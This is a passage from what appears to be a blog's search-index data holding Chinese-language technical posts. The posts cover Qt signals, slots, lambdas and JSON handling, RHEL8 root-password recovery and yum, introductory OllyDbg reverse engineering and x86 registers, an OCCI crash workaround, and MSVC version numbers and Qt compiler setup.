QPushButton * btn = new QPushButton(&quot;下课&quot; , this); resize(600,400); void(Teacher:: *teacherSignal2)() = &amp;Teacher::hungry; void(Student:: *studentSlot2)() = &amp;Student::treat; connect(zt,teacherSignal2, st,studentSlot2); //1、信号是可以连接信号 connect(btn,&amp;QPushButton::clicked,zt,teacherSignal2); //2、可以断开信号和槽 disconnect(zt,teacherSignal2, st,studentSlot2); //3、一个信号可以响应多个槽函数 //4、多个信号可以连接同一个槽函数 //5、信号和槽函数的参数类型 必须一一对应 // 信号的参数个数 可以多余槽函数的参数个数，反之不可以 , 参数类型要一一对应 //Qt4版本信号和槽写法 //利用Qt4版本连接有参信号和槽 //优势 ：参数直观 //劣势 ：参数类型不做匹配检测 // Qt4本质 SIGNAL(&quot;hungry(int)&quot;)SLOT(&quot;treat(QString)&quot;)// connect(zt, SIGNAL(hungry(QString)) , st , SLOT(treat(QString)));// classIsOver(); //[=] 函数体内可以使用Lambda所在作用范围内所有可见的局部变量 QPushButton * btn2 = new QPushButton(&quot;aaa&quot;,this); QPushButton * btn3 = new QPushButton(&quot;aaa&quot;,this); [=]()&#123; btn2-&gt;setText(&quot;bbb&quot;); btn3-&gt;setText(&quot;bbb&quot;); &#125;(); //最常用lambda使用 [=]()&#123;&#125; QPushButton * btn4 = new QPushButton(&quot;aaa&quot;,this); btn4-&gt;move( 100, 0); //当进行信号和槽连接时候，控件内会进入一个锁的状态 connect(btn4,&amp;QPushButton::clicked,this,[=]()&#123; btn4-&gt;setText(&quot;bbb&quot;); &#125;); //加上mutable修饰符后，可以修改按值传递进来的拷贝 QPushButton * myBtn = new QPushButton (this); QPushButton * myBtn2 = new QPushButton (this); myBtn2-&gt;move(100,100); int m = 10; connect(myBtn,&amp;QPushButton::clicked,this,[m] () mutable &#123; m = 20; qDebug() &lt;&lt; m; &#125;); connect(myBtn2,&amp;QPushButton::clicked,this,[=] () &#123; qDebug() &lt;&lt; m; &#125;); qDebug() &lt;&lt; m; //-&gt; 返回值类型 int num = [=]()-&gt;int&#123; return 1000; &#125;(); qDebug() &lt;&lt; &quot;num = &quot; &lt;&lt; num ; //点击按钮 关闭窗口 connect(btn4,&amp;QPushButton::clicked,[=]()&#123; //this-&gt;close(); st-&gt;treat(&quot;宫保鸡丁&quot;); &#125;);&#125;void Widget::classIsOver()&#123; //触发自定义信号// emit this-&gt;zt-&gt;hungry(); emit this-&gt;zt-&gt;hungry(&quot;宫保鸡丁&quot;);&#125;Widget::~Widget()&#123;&#125; Lambda表达式 C++11中的Lambda表达式用于定义并创建匿名的函数对象，以简化编程工作。首先看一下Lambda表达式的基本构成： 123456[capture](parameters) mutable -&gt;return-type&#123;statement&#125;[函数对象参数](操作符重载函数参数)mutable -&gt;返回值&#123;函数体&#125; 函数对象参数有以下形式： 空。没有使用任何函数对象参数。 = ：函数体内可以使用Lambda所在作用范围内所有可见的局部变量（包括Lambda所在类的this），并且是值传递方式（相当于编译器自动为我们按值传递了所有局部变量）。 &amp; ：函数体内可以使用Lambda所在作用范围内所有可见的局部变量（包括Lambda所在类的this），并且是引用传递方式（相当于编译器自动为我们按引用传递了所有局部变量）。this。函数体内可以使用Lambda所在类中的成员变量。 a ：将a按值进行传递。按值进行传递时，函数体内不能修改传递进来的a的拷贝，因为默认情况下函数是const的。要修改传递进来的a的拷贝，可以添加mutable修饰符。 &amp;a ：将a按引用进行传递。 a, &amp;b ：将a按值进行传递，b按引用进行传递。 =，&amp;a, &amp;b ：除a和b按引用进行传递外，其他参数都按值进行传递。 &amp;, a, b ：除a和b按值进行传递外，其他参数都按引用进行传递。 操作符重载函数参数； 标识重载的()操作符的参数，没有参数时，这部分可以省略。参数可以通过按值（如：(a,b)）和按引用（如：(&amp;a,&amp;b)）两种方式进行传递。 可修改标示符； mutable声明，这部分可以省略。按值传递函数对象参数时，加上mutable修饰符后，可以修改按值传递进来的拷贝（注意是能修改拷贝，而不是值本身）。 12345678910QPushButton * myBtn = new QPushButton (this);QPushButton * myBtn2 = new QPushButton (this);myBtn2-&gt;move(100,100);int m = 10;connect(myBtn,&amp;QPushButton::clicked,this,[m] ()mutable &#123; m = 20; qDebug() &lt;&lt; m; &#125;);connect(myBtn2,&amp;QPushButton::clicked,this,[=] () &#123; qDebug() &lt;&lt; m; &#125;);qDebug() &lt;&lt; m; 函数返回值； -&gt;返回值类型，标识函数返回值的类型，当返回值为void，或者函数体中只有一处return的地方（此时编译器可以自动推断出返回值类型）时，这部分可以省略。 {}是函数体； ​ {}，标识函数的实现，这部分不能省略，但函数体可以为空。","categories":[{"name":"Qt","slug":"Qt","permalink":"https://xiaowuyoucy.github.io/categories/Qt/"}],"tags":[]},{"title":"安装与配置Linux操作系统","slug":"安装与配置Linux操作系统","date":"2023-04-10T14:29:52.000Z","updated":"2023-04-11T16:16:03.934Z","comments":true,"path":"2023/04/10/安装与配置Linux操作系统/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/04/10/安装与配置Linux操作系统/","excerpt":"","text":"Linux一般由3个部分组成：内核(kernel)、命令解析层（Shell或其他操作环境）、实用工具。 重置root管理员密码 （1）先确认是RHEL8 1cat /etc/redhat-release （2）在终端输入reboot，重启之后按E进入内核编辑模式 （3） 在linux参数行的最后面追加 “rd.break” 然后按下CTRL+X 运行修改过的内核程序 （4）进入紧急模式。依次输入以下命令 123456mount -o remount,rw /sysrootchroot /sysrootpasswd 这一步按下回车后要输入新密码和确认新密码,输入过程不显示touch /.autorelabelexitreboot yum软件仓库 yum软件仓库是为了解决安装软件的时候,如果需要大量的依赖,安装起来是非常痛苦的,所以yum的出现是为了降低软件安装的难度。 RHEL 先将发布的软件存放到yum服务器内，然后分析软件的依赖属性，将分析出来的软件信息生成清单列表 容器：软件清单列表数据和软件所在的位置称为容器 Linux用户安装程序—&gt; 先yum服务器中的容器发起下载xxxx软件清单的请求-------客户机得到清单列表后会和本机的RPM数据库做比较,比较后把不存在的依赖一步下载过来就可以了.","categories":[{"name":"RHEL8","slug":"RHEL8","permalink":"https://xiaowuyoucy.github.io/categories/RHEL8/"}],"tags":[]},{"title":"逆向工程基础","slug":"逆向工程基础","date":"2022-07-10T09:21:30.000Z","updated":"2022-07-13T17:31:26.457Z","comments":true,"path":"2022/07/10/逆向工程基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/07/10/逆向工程基础/","excerpt":"","text":"关于逆向工程 逆向工程（Reverse Engineering，简称RE) 代码逆向工程（Reverse Code Engineering，简称RCE） 逆向分析法 静态分析法 在不执行代码文件的情形下，对代码进行静态分析的一种方法。 动态分析法 在程序文件的执行过程中对代码进行动态分析 Hex Editor是一个简单易用的工具，使用它可以轻松地把二进制文件转换为十六进制文件。 “打补丁”与“破解” 对应用程序文件或进程内存内容的更改被称为“打补丁”（Patch），“破解”（Crack）与其含义类似 逆向分析Hello World！程序 OllyDbg: http://www.ollydbg.de OllyDbg是一种强大的Win32调试工具 入口点 EP是Windows可执行文件（EXE、DLL、SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU。 调试器停止的地点即为HelloWorld.exe执行的起始地址，它是一段EP （EntryPoint，入口点）代码。 地址：进程的虚拟内存地址（Virtual Address， VA） 指令：IA32 （或x86） CPU指令 反汇编代码：将OP code转换为便于查看的汇编指令 注释：调试器添加的注释（根据选项不同，显示的注释略有不同） OllyDbg基本指令 123456789101112131415161718192021222324252627F2： 设置断点/取消断点F7： 单步步入F8： 单步执行Ctrl + F2： 重新调试Ctrl+G： 跳转到指定地址（查看代码时使用，非运行时命令）F9： 运行（遇到断点时暂停）Ctrl+F9： 执行函数代码内的命令，直到遇到RETN命令，用于跳出函数体F4： 执行到光标所在位置（直接转到要调试的位置）; 添加注释: 添加标签* 显示当前EIP(命令指针)位置- 显示上一个光标位置Enter： 若光标处有CALL/JMP等指令，则跟踪并显示相关地址（运行时不可用，简单查看函数内容时非常有用）空格键： 编辑汇编代码 设置“大本营”的四种方法 1.Goto命令 执行Go to（Ctrl+G）命令 2.设置断点 在OllyDbg菜单栏中依次选择View-Breakpoints选项（快捷键（ALT+B）），打开Breakpoints对话框，列出代码中设置的断点 在断点列表中双击某个断点会直接跳转到相应位置。 3.注释 按键盘上的“；”键可以在指定地址处添加注释，还可以通过查找命令找到它。 在鼠标右键菜单中依次选择Search for-User defined comment，这样就能看到用户输入的所有注释 双击相应注释，光标将自动定位到相应位置。 4.标签 单击鼠标右键，依次选择Search forlUser defined labels菜单即可打开User defined labels窗口，该窗口列出了用户设置的标签 在User defined labels窗口中双击某个标签，光标即移动到相应位置。 快速查找指定代码的四种方法 1.代码执行法 2.字符串检索法 鼠标右键菜单-Search for-All referenced text strings 双击字符串，光标定位到使用该字符串的指令处 VC++中， static字符串会被默认保存为Unicode码形式， static字符串是指在程序内部被硬编码（Hard Coding）的字符串。 API检索法（1）：在调用代码中设置断点 鼠标右键菜单-Search for-All intermodular calls 双击它，光标即定位到调用它的地址处 API检索法（2）：在API代码中设置断点 鼠标右键菜单-Search for-Name in all calls 在OllyDbg菜单栏中依次选择View-Memory菜单（快捷键Alt+M），打开内存映射窗口。内存映射窗口中显示了一部分HelloWorld.exe进程内存。在图底部的方框中可以看到，USER32库被加载到了内存。 使用OllyDbg中的Name in all modules命令可以列出被加载的DLL文件中提供的所有API。使用Name in all modules命令打开All names窗口，单击Name栏目按名称排序，通过键盘敲出MessageBoxW后，光标会自动定位到MessageBoxW上 双击MessageBoxW函数后就会显示其代码，它实现于USER32.dll库中 模块中的地址和本程序的地址是完全不同的。 修改字符串的两种方法 1.直接修改字符串缓冲区 在Dump窗口中按Ctrl+G快捷键执行Go to命令，在弹出窗口中输入地址进入字符串缓冲区。然后使用鼠标选中地址处的字符串，按Ctrl+E快捷键打开编辑窗口 注意: 若新字符串长度大于原有字符串，执行覆盖操作时可能损坏字符串后面的数据，所以一定要小心。特别是字符串后面有非常重要的数据时，覆盖操作导致数据损坏就会引发程序内存引用错误。 新字符串的长度不应比原字符串长。 保存更改到可执行文件 选中更改后的“Hello Reversing”字符串，单击鼠标右键，在弹出的菜单中选择Copy to executable file菜单 在弹出的Hex窗口中单击鼠标右键，选择Save file菜单，在Save file as对话框中输人文件名“Hello Reversing.exe”后保存为.exe可执行文件。 2.在其他内存区域新建字符串并传递给消息函数 小端序标记法 字节序 字节型: 大小端的字节顺序都是一样的。 大端：低地址放数据的高位 小端：高地址放数据的低位 OD中查看小端序 IA-32寄存器基本讲解 什么是CPU寄存器 寄存器是CPU内部用来存放数据的一些小型存储区域 基本程序运行寄存器 通用寄存器（ General Purpose Registers， 32位， 8个） 段寄存器（ Segment Registers， 16位， 6个） 程序状态与控制寄存器（ Program Status and Control Registers， 32位， 1个） 指令指针寄存器（Instruction Pointer， 32位， 1个） EAX：（0~31）32位 AX：（0~15）EAX的低16位 AH：（8~15）AX的高8位 AL：（0-7）AX的低8位 循环命令（LOOP）中，ECX用来循环计数（loop count），每执行一次循环，ECX都会减1。EAX一般用在函数返回值中，所有Win32API函数都会先把返回值保存到EAX再返回。 Win32 API函数在内部会使用ECX与EDX EBP：（SS段中栈内数据指针）扩展基址指针寄存器 ESI：（字符串操作源指针）源变址寄存器 EDI：（字符串操作目标指针）目的变址寄存器 ESP：（SS段中栈指针）栈指针寄存器 ESP指示栈区域的栈顶地址 EBP表示栈区域的基地址，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃，这称为栈帧技术。 ESI和EDI与特定指令（LODS、STOS、REP、MOVS等）一起使用，主要用于内存复制。 段寄存器 段内存记录在SDT（Segment Descriptor Table，段描述符表） 段寄存器就持有这些SDT的索引（index）。 段寄存器有6各个：CS 、SS、DS、ES、FS、GS 每个寄存器大小为16位，2个字节。 每个段寄存器指向的段描述符（Segment Descriptor）与虚拟内存结合，形成一个线性地址（Linear Address），借助分页技术，线性地址最终被转换为实际的物理地址（Physical Address）。 CS： Code Segment，代码段寄存器 SS： Stack Segment，栈段寄存器 DS： Data Segment，数据段寄存器 ES： Extra （Data） Segment，附加（数据）段寄存器 FS： Data Segment，数据段寄存器 GS： Data Segment，数据段寄存器 程序调试中会经常用到FS寄存器，它用于计算SEH（Structured Exception Handler，结构化异常处理机制）、TEB（Thread Environment Block，线程环境块）、PEB（Process Environment Block，进程环境块）等地址 程序状态与控制寄存器 EFLAGS：Flag Register，标志寄存器 其大小为4个字节（32位） EFLAGS寄存器的每位都有意义，每位的值或为1或为0，代表On/Off或True/False。 ZF（Zero Flag，零标志） OF（Overflow Flag，溢出标志) CF（Carry Flag，进位标志） ZF 若运算结果为0，则其值为1（True），否则其值为0（False）。 OF 有符号整数（signed integer）溢出时， OF值被置为1。此外， MSB （Most Significant Bit， 最高有效位）改变时，其值也被设为1。 CF 无符号整数（unsigned integer）溢出时，其值也被置为1。 指令指针寄存器 EIP：Instruction Pointer，指令指针寄存器 程序运行时，CPU会读取EIP中一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小。 不能直接修改EIP的值，只能通过其他指令间接修改 栈 （1）暂时保存函数内的局部变量。 （2）调用函数时传递参数。 （3）保存函数返回后的地址。 栈其实是一种数据结构，它按照FILO（First In Last Out，后进先出）的原则存储数据。 栈顶指针（ESP）初始状态指向栈底端。 执行PUSH命令将数据压入栈时，栈顶指针就会上移到栈顶端。 执行POP命令从栈中弹出数据时，若栈为空，则栈顶指针重新移动到栈底端。 栈是一种由高地址向低地址扩展的数据结构 栈是逆向扩展的 从栈中弹出数据后，ESP随之向下移动。 向栈压入数据时，栈顶指针减小，向低地址移动；从栈中弹出数据时，栈顶指针增 加，向高地址移动。 汇编指令 函数参数压入栈时是从最后一个参数开始压入的。","categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://xiaowuyoucy.github.io/categories/逆向工程/"}],"tags":[]},{"title":"Qt操作Json","slug":"Qt操作Json","date":"2022-06-25T16:30:11.000Z","updated":"2022-06-27T08:07:00.698Z","comments":true,"path":"2022/06/26/Qt操作Json/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/26/Qt操作Json/","excerpt":"","text":"json介绍: json分为: json对象 json数组 json对象: 12345678910&#123; &quot;class&quot;:31, &quot;count&quot;:51, &quot;master&quot;:&quot;yalong&quot;, &quot;banzhuren&quot;:&quot;chenlaoshi&quot;, &quot;like&quot;:[&quot;dancing&quot;, &quot;sing&quot;, &quot;drinking&quot;], &quot;hometown&quot;:&#123;&quot;hebei&quot;:&quot;baoding&quot;, &quot;henan&quot;:&quot;xinyang&quot;&#125; &#125; json数组: 1[10, 10.5, [&quot;xiaohu&quot;, &quot;liming&quot;, 10], &#123;&quot;name&quot;:&quot;xiaohu&quot;, &quot;age&quot;:32, &quot;sex&quot;:&quot;man&quot;&#125;] 1 json对象格式的数据都是以key:value的形式存在的, 其中key值是字符串形式的. 2 在json对象中, value值可以是子对象, 也可以是数组 3 在json格式的文件中, 只能是json对象或者是json数组 4 在json数组中, 数据的类型不定, 可以是double int string 子对象, 子数组. 头文件 123456#include &lt;QJsonDocument&gt;#include &lt;QJsonArray&gt;#include &lt;QJsonObject&gt;#include &lt;QByteArray&gt;#include &lt;QJsonValue&gt;#include &lt;QFile&gt; json对象操作 创建json对象 1QJsonObject json; 给json对象插入值 1iterator QJsonObject::insert(const QString &amp;key, const QJsonValue &amp;value) json数组操作 创建json数组 1QJsonArray jsonArr; 给json数组插入值 1void QJsonArray::append(const QJsonValue &amp;value) 将QJsonObject 或QJsonArray转换为 QJsonDocument 123JsonDocument::QJsonDocument(const QJsonObject &amp;object) //将json对象转换为QJsonDocumentJsonDocument::QJsonDocument(const QJsonArray &amp;array) //将json数组转换为QJsonDocument 将QJsonDocument对象转换为QByteArray对象 1QByteArray QJsonDocument::toJson(JsonFormat format = Indented) const 操作文件 创建文件对象 123QFile::QFile(const QString &amp;name)QFile file(fileName); 打开文件 1234567891011121314virtual bool open(OpenMode mode)QIODevice::NotOpen 0x0000 The device is not open.QIODevice::ReadOnly 0x0001 The device is open for reading.QIODevice::WriteOnly 0x0002 The device is open for writing. Note that this mode implies Truncate.QIODevice::ReadWrite ReadOnly | WriteOnly The device is open for reading and writing.QIODevice::Append 0x0004 The device is opened in append mode so that all data is written to the end of the file.QIODevice::Truncate 0x0008 If possible, the device is truncated before it is opened. All earlier contents of the device are lost.QIODevice::Text 0x0010 When reading, the end-of-line terminators are translated to &apos;\\n&apos;. When writing, the end-of-line terminators are translated to the local encoding, for example &apos;\\r\\n&apos; for Win32.QIODevice::Unbuffered 0x0020 Any buffer in the device is bypassed. 读文件 123QByteArray QIODevice::readAll() //一次性读完QByteArray byteArray = file.readAll(); 将QByteArray类对象转换为QJsonDocument 123QJsonDocument fromJson(const QByteArray &amp;json, QJsonParseError *error = Q_NULLPTR)QJsonDocument jsonDoc = QJsonDocument::fromJson(byteArray); 判断是不是对象 1bool QJsonDocument::isObject() const 将QJsonDocument转换为QJsonObject 1QJsonObject QJsonDocument::object() const 将QJsonDocument转换为QJsonArray 1QJsonArray QJsonDocument::array() const 获取对象中所有的key值 1QStringList QJsonObject::keys() const 返回key的数量 1int QJsonObject::size() const 根据key值获取value值 12QJsonValue QJsonObject::value(const QString &amp;key) constQJsonValue QJsonObject::value(QLatin1String key) const 判断value值的类型 1234567bool isArray() constbool isBool() constbool isDouble() constbool isNull() constbool isObject() constbool isString() constbool isUndefined() const 将value转换到对应类型的值 12345678910111213141516QJsonArray toArray(const QJsonArray &amp;defaultValue) const //转换到数组QJsonArray toArray() const //转换到数组bool toBool(bool defaultValue = false) const //转换到布尔double toDouble(double defaultValue = 0) const //转换到到doubleint toInt(int defaultValue = 0) const //转换到整型QJsonObject toObject(const QJsonObject &amp;defaultValue) const //转换到对象QJsonObject toObject() const //转换到对象QString toString() const //转换到字符串QString toString(const QString &amp;defaultValue) const //转换到字符串QVariant toVariant() const 将QJsonDocument转换为const char * 1const char *QJsonDocument::rawData(int *size) const 将const char * 转换为QJsonDocument 1fromRawData(const char *data, int size, DataValidation validation = Validate) 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255#include &lt;QCoreApplication&gt;#include &lt;QJsonDocument&gt;#include &lt;QJsonArray&gt;#include &lt;QJsonObject&gt;#include &lt;QByteArray&gt;#include &lt;QJsonValue&gt;#include &lt;QFile&gt;#include &lt;QDebug&gt;void writeJsonToFile(char *fileName)&#123; //第一种: 将json对象写入磁盘文件 //创建一个json对象 /*QJsonObject json; //给json对象插入值 // iterator insert(const QString &amp;key, const QJsonValue &amp;value) json.insert(\"name\", \"xiaowu\"); json.insert(\"age\", 21); json.insert(\"sex\", \"female\"); //插入子对象 QJsonObject subJson; subJson.insert(\"father\", \"longji\"); subJson.insert(\"mather\", \"liwei\"); subJson.insert(\"sister\", \"wangjin\"); json.insert(\"family\", subJson); //插入json数组 QJsonArray jsonArr; jsonArr.append(\"english\"); jsonArr.append(\"chinese\"); jsonArr.append(\"math\"); jsonArr.append(\"history\"); json.insert(\"course\", jsonArr);*/ //第二种: 将json数组写入磁盘文件 //构造一个QJsonArray对象 QJsonArray array; //void append(const QJsonValue &amp;value) //给array对象添加值 array.append(10); array.append(\"jinyanlong\"); array.append(true); //添加子数组到array中 QJsonArray subArray; subArray.append(\"english\"); subArray.append(\"chinese\"); subArray.append(\"history\"); array.append(subArray); //添加对象到array中 QJsonObject subObj; subObj.insert(\"mother\", \"xiaoling\"); subObj.insert(\"father\", \"xiaotong\"); subObj.insert(\"sister\", \"damiao\"); array.append(subObj); //将QJsonObject 转换为 QJsonDocument //JsonDocument::QJsonDocument(const QJsonObject &amp;object) //QJsonDocument jsonDoc(json); //QJsonDocument(const QJsonArray &amp;array) QJsonDocument jsonDoc(array); //将QJsonDocument对象转换为QByteArray对象 //QByteArray toJson(JsonFormat format = Indented) const QByteArray byteArray = jsonDoc.toJson(); //文件操作--将byteArray写入文件 //QFile(const QString &amp;name) QFile file(fileName); //打开文件 //virtual bool open(OpenMode mode) file.open(QIODevice::WriteOnly); //写文件 //qint64 write(const QByteArray &amp;byteArray) file.write(byteArray); //关闭文件 //virtual void close() file.close(); return;&#125;void readJsonFromFile(char *fileName)&#123; //构造QFile类对象 QFile file; //设置要读的文件 //void setFileName(const QString &amp;name) file.setFileName(fileName); //打开文件 //virtual bool open(OpenMode mode) file.open(QIODevice::ReadOnly); //读文件 //QByteArray readAll() QByteArray byteArray = file.readAll(); //关闭文件 //virtual void close() file.close(); //将QByteArray类对象转换为QJsonDocument //QJsonDocument fromJson(const QByteArray &amp;json, QJsonParseError *error = Q_NULLPTR) QJsonDocument jsonDoc = QJsonDocument::fromJson(byteArray); //判断是数组还是对象 if(jsonDoc.isObject()) &#123; //QJsonObject object() const QJsonObject jsonObj = jsonDoc.object(); //获取对象中所有的key值 //QStringList keys() const QStringList keys = jsonObj.keys(); for(int i=0; i&lt;keys.size(); i++) &#123; //获取每一个key值 //QString key = keys[i]; QString key = keys.at(i); //qDebug() &lt;&lt; key &lt;&lt; \":\"; //根据key值获取value值 //QJsonValue value(const QString &amp;key) const //QJsonValue operator[](const QString &amp;key) const QJsonValue jsonValue = jsonObj.value(key); //判断value值的类型 //bool isString() const if(jsonValue.isString()) &#123; qDebug() &lt;&lt; key &lt;&lt; \":\" &lt;&lt; jsonValue.toString(); &#125; else if(jsonValue.isDouble()) &#123; qDebug() &lt;&lt; key &lt;&lt; \":\" &lt;&lt; jsonValue.toInt(); &#125; else if(jsonValue.isBool()) &#123; qDebug() &lt;&lt; key &lt;&lt; \":\" &lt;&lt; jsonValue.toBool(); &#125; else if(jsonValue.isObject()) &#123; //QJsonObject toObject() const QJsonObject obj = jsonValue.toObject(); QStringList subKeys = obj.keys(); qDebug() &lt;&lt; key &lt;&lt; \":&#123;\"; for(int k=0; k&lt;subKeys.size(); k++) &#123; QString subkey = subKeys[k]; QJsonValue subJsonValue = obj.value(subkey); qDebug() &lt;&lt; \" \" &lt;&lt; subJsonValue.toString(); &#125; qDebug() &lt;&lt; \"&#125;\"; &#125; else if(jsonValue.isArray()) &#123; //QJsonArray toArray() const qDebug() &lt;&lt; key &lt;&lt; \":[\"; QJsonArray arr = jsonValue.toArray(); for(int j=0; j&lt;arr.size(); j++) &#123; QJsonValue va = arr[j]; if(va.isString()) &#123; qDebug() &lt;&lt; \" \" &lt;&lt; va.toString(); &#125; &#125; qDebug() &lt;&lt;\"]\"; &#125; &#125; &#125; else if(jsonDoc.isArray()) &#123; //QJsonArray array() const QJsonArray array = jsonDoc.array(); for(int i=0; i&lt;array.size(); i++) &#123; QJsonValue value = array[i]; //判断值的类型 if(value.isString()) &#123; qDebug() &lt;&lt; value.toString(); &#125; else if(value.isDouble()) &#123; qDebug() &lt;&lt; value.toInt(); &#125; else if(value.isBool()) &#123; qDebug() &lt;&lt; value.toBool(); &#125; else if(value.isArray()) &#123; qDebug() &lt;&lt; \"[\"; QJsonArray subArray = value.toArray(); for(int j=0; j&lt;subArray.size(); j++) &#123; qDebug() &lt;&lt; \" \" &lt;&lt; subArray[j].toString(); &#125; qDebug() &lt;&lt; \"]\"; &#125; else if(value.isObject()) &#123; qDebug() &lt;&lt; \"&#123;\"; QJsonObject subObj = value.toObject(); QStringList subKeys = subObj.keys(); for(int k=0; k&lt;subKeys.size(); k++) &#123; QString subkey = subKeys[k]; QJsonValue value = subObj[subkey]; if(value.isString()) &#123; qDebug() &lt;&lt; \" \" &lt;&lt; value.toString(); &#125; &#125; qDebug() &lt;&lt; \"&#125;\"; &#125; &#125; &#125;&#125;int main(int argc, char *argv[])&#123; QCoreApplication a(argc, argv); //写json数据到文件 writeJsonToFile(\"test.json\"); //读json文件 readJsonFromFile(\"test.json\"); return a.exec();&#125;","categories":[{"name":"Qt","slug":"Qt","permalink":"https://xiaowuyoucy.github.io/categories/Qt/"}],"tags":[]},{"title":"occi连接数据库getString函数报错","slug":"occi连接数据库rs","date":"2022-06-17T13:40:16.000Z","updated":"2022-06-19T04:52:27.425Z","comments":true,"path":"2022/06/17/occi连接数据库rs/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/17/occi连接数据库rs/","excerpt":"","text":"1、报错代码： 123456while (rs-&gt;next()) &#123; int nID = rs-&gt;getInt(1); int nDVDID = rs-&gt;getInt(2); string strName = rs-&gt;getString(3); &#125; 2、报错信息： OcciToOracle.exe 中的 0x5c99336f (msvcp100d.dll) 处有未经处理的异常: 0xC0000005: 读取位置 0xffffffffffffffff 时发生访问冲突 错误定位： 12345678910111213141516inline void _Container_base12::_Orphan_all() &#123; // orphan all iterators #if _ITERATOR_DEBUG_LEVEL == 2 if (_Myproxy != 0) &#123; // proxy allocated, drain it _Lockit _Lock(_LOCK_DEBUG); for (_Iterator_base12 **_Pnext = &amp;_Myproxy-&gt;_Myfirstiter; *_Pnext != 0; *_Pnext = (*_Pnext)-&gt;_Mynextiter) (*_Pnext)-&gt;_Myproxy = 0; _Myproxy-&gt;_Myfirstiter = 0; &#125; #endif /* _ITERATOR_DEBUG_LEVEL == 2 */ &#125; 3、解决方法： 将 1string strName = rs-&gt;getString(3); 更改为： 1static string strName = rs-&gt;getString(3); 前面加上static。 问题解决了，但是不清楚问题原因！ 重点：这也造成了多条记录循环取值时只能得到第一次的值。 可能是oracle客户端occi库版本和编译器版本不一致导致的,linux降低了g++版本之后就编译通过了,并且没有出现问题.","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"如何查看VS编译器版本号","slug":"如何查看VS编译器版本号","date":"2022-06-17T13:31:55.000Z","updated":"2022-06-17T13:34:20.530Z","comments":true,"path":"2022/06/17/如何查看VS编译器版本号/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/17/如何查看VS编译器版本号/","excerpt":"","text":"12345678#include &lt;iostream&gt;using namespace std;int main() &#123; int ver = _MSC_VER; // get the version cout &lt;&lt; &quot;MSVC Version: &quot; &lt;&lt; ver &lt;&lt; endl; return 0;&#125; MSC 1.0 _MSC_VER == 100 MSC 2.0 _MSC_VER == 200 MSC 3.0 _MSC_VER == 300 MSC 4.0 _MSC_VER == 400 MSC 5.0 _MSC_VER == 500 MSC 6.0 _MSC_VER == 600 MSC 7.0 _MSC_VER == 700 MSVC++ 1.0 _MSC_VER == 800 MSVC++ 2.0 _MSC_VER == 900 MSVC++ 4.0 _MSC_VER == 1000 (Developer Studio 4.0) MSVC++ 4.2 _MSC_VER == 1020 (Developer Studio 4.2) MSVC++ 5.0 _MSC_VER == 1100 (Visual Studio 97 version 5.0) MSVC++ 6.0 _MSC_VER == 1200 (Visual Studio 6.0 version 6.0) MSVC++ 7.0 _MSC_VER == 1300 (Visual Studio .NET 2002 version 7.0) MSVC++ 7.1 _MSC_VER == 1310 (Visual Studio .NET 2003 version 7.1) MSVC++ 8.0 _MSC_VER == 1400 (Visual Studio 2005 version 8.0) MSVC++ 9.0 _MSC_VER == 1500 (Visual Studio 2008 version 9.0) MSVC++ 10.0 _MSC_VER == 1600 (Visual Studio 2010 version 10.0) MSVC++ 11.0 _MSC_VER == 1700 (Visual Studio 2012 version 11.0) MSVC++ 12.0 _MSC_VER == 1800 (Visual Studio 2013 version 12.0) MSVC++ 14.0 _MSC_VER == 1900 (Visual Studio 2015 version 14.0) MSVC++ 14.1 _MSC_VER == 1910 (Visual Studio 2017 version 15.0) MSVC++ 14.11 _MSC_VER == 1911 (Visual Studio 2017 version 15.3) MSVC++ 14.12 _MSC_VER == 1912 (Visual Studio 2017 version 15.5) MSVC++ 14.13 _MSC_VER == 1913 (Visual Studio 2017 version 15.6) MSVC++ 14.14 _MSC_VER == 1914 (Visual Studio 2017 version 15.7) MSVC++ 14.15 _MSC_VER == 1915 (Visual Studio 2017 version 15.8) MSVC++ 14.16 _MSC_VER == 1916 (Visual Studio 2017 version 15.9) MSVC++ 14.2 _MSC_VER == 1920 (Visual Studio 2019 Version 16.0) MSVC++ 14.21 _MSC_VER == 1921 (Visual Studio 2019 Version 16.1) MSVC++ 14.22 _MSC_VER == 1922 (Visual Studio 2019 Version 16.2)","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"Qt配置使用MSVC编译器","slug":"Qt配置使用MSVC编译器","date":"2022-06-15T16:08:20.000Z","updated":"2022-06-15T16:17:15.314Z","comments":true,"path":"2022/06/16/Qt配置使用MSVC编译器/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/16/Qt配置使用MSVC编译器/","excerpt":"","text":"注意:Qt支持的MSVC就是2017和2015，所以vs也要下载2017，不要直接用最新的，安装路径都用默认的。程序运行失败时可以尝试windeployqt拷贝库文件到本地，然后有可能就能运行了 VS官网下载Visual Studio Community 2017，在线安装Visual Studio Community2017版本。vs2017如何配置见附文一 下载并安装Windows10 SDK, 直接下载.exe版本，然后安装。安装中，切记选择Debugging Toolsfor Windows组件，因为在后面需要用这个。 下载并安装Qt Creator，由于最新的版本好像没有集成mysql的驱动，所以我使用的是较先的5.12.2版本。安装Qt Creator的过程中，记得在安装组件过程中，安装MSVC2017 32位和MSVC2017 32位。注意：建议32位和64位都安装，32位可以在64位系统使用，但是返过来不行 配置Debuggers，具体位置在菜单栏-工具-选项-Kits-Debuggers中。当你Windows 10 SDK安装成功后，他会自动出现这两个exe。 当然你也可以自己配置一个，具体如下： 我配置的就是这样： 